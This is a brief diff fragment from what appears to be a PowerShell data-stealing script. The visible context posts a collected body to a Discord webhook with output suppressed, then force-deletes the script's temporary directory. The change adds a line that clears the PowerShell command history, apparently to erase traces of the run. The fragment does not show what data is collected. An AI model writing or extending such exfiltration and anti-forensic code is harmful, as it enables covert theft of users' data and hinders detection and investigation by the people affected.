@@ -21,3 +21,6 @@ Invoke-RestMethod -Uri $discord -Method 'post' -Body $body >$null;
 
 # Delete the temporary directory and exit the script
 cd ..; rm $p -r -fo; exit;
+
+# Clear the PowerShell command history
+Clear-History
